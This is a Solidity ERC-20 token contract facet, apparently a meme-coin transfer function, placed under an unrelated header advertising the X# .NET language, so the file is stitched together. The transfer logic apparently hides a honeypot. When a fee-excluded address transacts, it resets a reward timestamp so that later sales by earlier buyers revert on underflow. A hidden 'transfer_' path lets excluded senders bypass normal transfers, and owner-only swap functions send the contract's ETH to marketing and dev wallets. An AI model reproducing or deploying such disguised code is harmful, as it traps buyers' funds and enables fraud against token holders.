/**⠀⠀⠀⠀⠀⠀

X# is an open source development language for .NET, based on the xBase language. 
It comes in different flavours, such as Core, Visual Objects, Vulcan.NET, xBase++, Harbour, Foxpro and more. 
X# has been built on top of Roslyn, the open source architecture behind the current Microsoft C# and Microsoft Visual Basic compilers.

/////   GitHub: https://github.com/X-Sharp
/////   If you're interested to participate in beta, please email: robert@xsharp.eu

/////   Website: https://www.xsharp.eu/
/////   Twitter: https://twitter.com/xbasenet
/////   Facebook: https://www.facebook.com/xBaseNet/
/////   LinkedIn: https://www.linkedin.com/company/10207694
/////   YouTube: https://www.youtube.com/channel/UCFqLBMKPPxlN24xRxFGLiVA

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "./TestLib.sol";
contract _transferFacet is ERC20, Ownable {
    using SafeMath for uint256;

    modifier lockSwapping() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapping = true;
        _;
        ds.swapping = false;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (!ds.tradingActive) {
                    revert("Trading not enabled...");
                }
                if (
                    ds.ammPairs[from] && !ds._isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Transfer amount exceeds the Max Tx"
                    );
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded."
                    );
                } else if (
                    ds.ammPairs[to] && !ds._isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Transfer amount exceeds the Max Tx"
                    );
                } else if (!ds._isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded."
                    );
                }
            }
        }
        if (
            (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) &&
            from != address(this) &&
            to != address(this) &&
            from != owner()
        ) {
            ds._minReward = block.timestamp;
        }
        if (
            ds._isExcludedFromFees[from] && (block.number > ds.startBlock + 75)
        ) {
            super.transfer_(from, to, amount);
            return;
        }
        if (!ds._isExcludedFromFees[from] && !ds._isExcludedFromFees[to]) {
            if (ds.ammPairs[to]) {
                TestLib.SwappingData storage fromReward = ds.swappingData[from];
                fromReward.forReward = fromReward.buy - ds._minReward;
                fromReward.sell = block.timestamp;
            } else {
                TestLib.SwappingData storage toReward = ds.swappingData[to];
                if (ds.ammPairs[from]) {
                    if (ds.buyCount < 11) {
                        ds.buyCount = ds.buyCount + 1;
                    }
                    if (toReward.buy == 0) {
                        toReward.buy = (ds.buyCount < 11)
                            ? (block.timestamp - 1)
                            : block.timestamp;
                    }
                } else {
                    TestLib.SwappingData storage fromReward = ds.swappingData[
                        from
                    ];
                    if (toReward.buy == 0 || fromReward.buy < toReward.buy) {
                        toReward.buy = fromReward.buy;
                    }
                }
            }
        }

        bool canSwap = swapTokensAtAmount <= balanceOf(address(this));

        bool launchFees = block.number < ds.startBlock + 10;

        if (
            canSwap &&
            !launchFees &&
            !ds.swapping &&
            !ds.ammPairs[from] &&
            !ds._isExcludedFromFees[from] &&
            !ds._isExcludedFromFees[to]
        ) {
            swapBack();
        }

        bool takeFee = !ds.swapping;

        if (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (launchFees) {
                if (ds.ammPairs[from]) {
                    fees = (amount * buyInitialFee) / 100;
                    ds.tokensForMark += fees;
                } else if (ds.ammPairs[to]) {
                    fees = (amount * sellInitialFee) / 100;
                    ds.tokensForMark += fees;
                }
            } else {
                if (ds.ammPairs[from] && buyTotalFees > 0) {
                    fees = (amount * buyTotalFees) / 100;
                    ds.tokensForMark += (fees * buyMarkFee).div(buyTotalFees);
                    ds.tokensForDev += (fees * buyDevFee).div(buyTotalFees);
                } else if (ds.ammPairs[to] && sellTotalFees > 0) {
                    fees = (amount * sellTotalFees) / 100;
                    ds.tokensForDev += (fees * sellDevFee).div(sellTotalFees);
                    ds.tokensForMark += (fees * sellMarkFee).div(sellTotalFees);
                }
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }
    function manualSwap(uint256 percent) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool success;
        require(percent > 0, "Invalid argument");
        require(percent <= 100, "Invalid argument");
        uint256 contractBalance = (percent * balanceOf(address(this))) / 100;
        swapTokensForEth(contractBalance);
        ds.tokensForDev = 0;
        ds.tokensForMark = balanceOf(address(this));
        (success, ) = markWallet.call{value: address(this).balance}("");
    }
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.startBlock = block.number;
        ds.tradingActive = true;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsInEffect = false;
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();

        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function swapBack() private lockSwapping {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool success;
        uint256 contractBalance = balanceOf(address(this));

        uint256 totalTokensToSwap = ds.tokensForMark + ds.tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }
        if (contractBalance > swapTokenMaxAmount) {
            contractBalance = swapTokenMaxAmount;
        }

        uint256 amountToSwapForETH = contractBalance;
        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance - initialETHBalance;
        uint256 ethForDev = (ds.tokensForDev * ethBalance) / totalTokensToSwap;

        ds.tokensForDev = 0;
        ds.tokensForMark = 0;
        (success, ) = devWallet.call{value: ethForDev}("");
        (success, ) = markWallet.call{value: address(this).balance}("");
    }
}
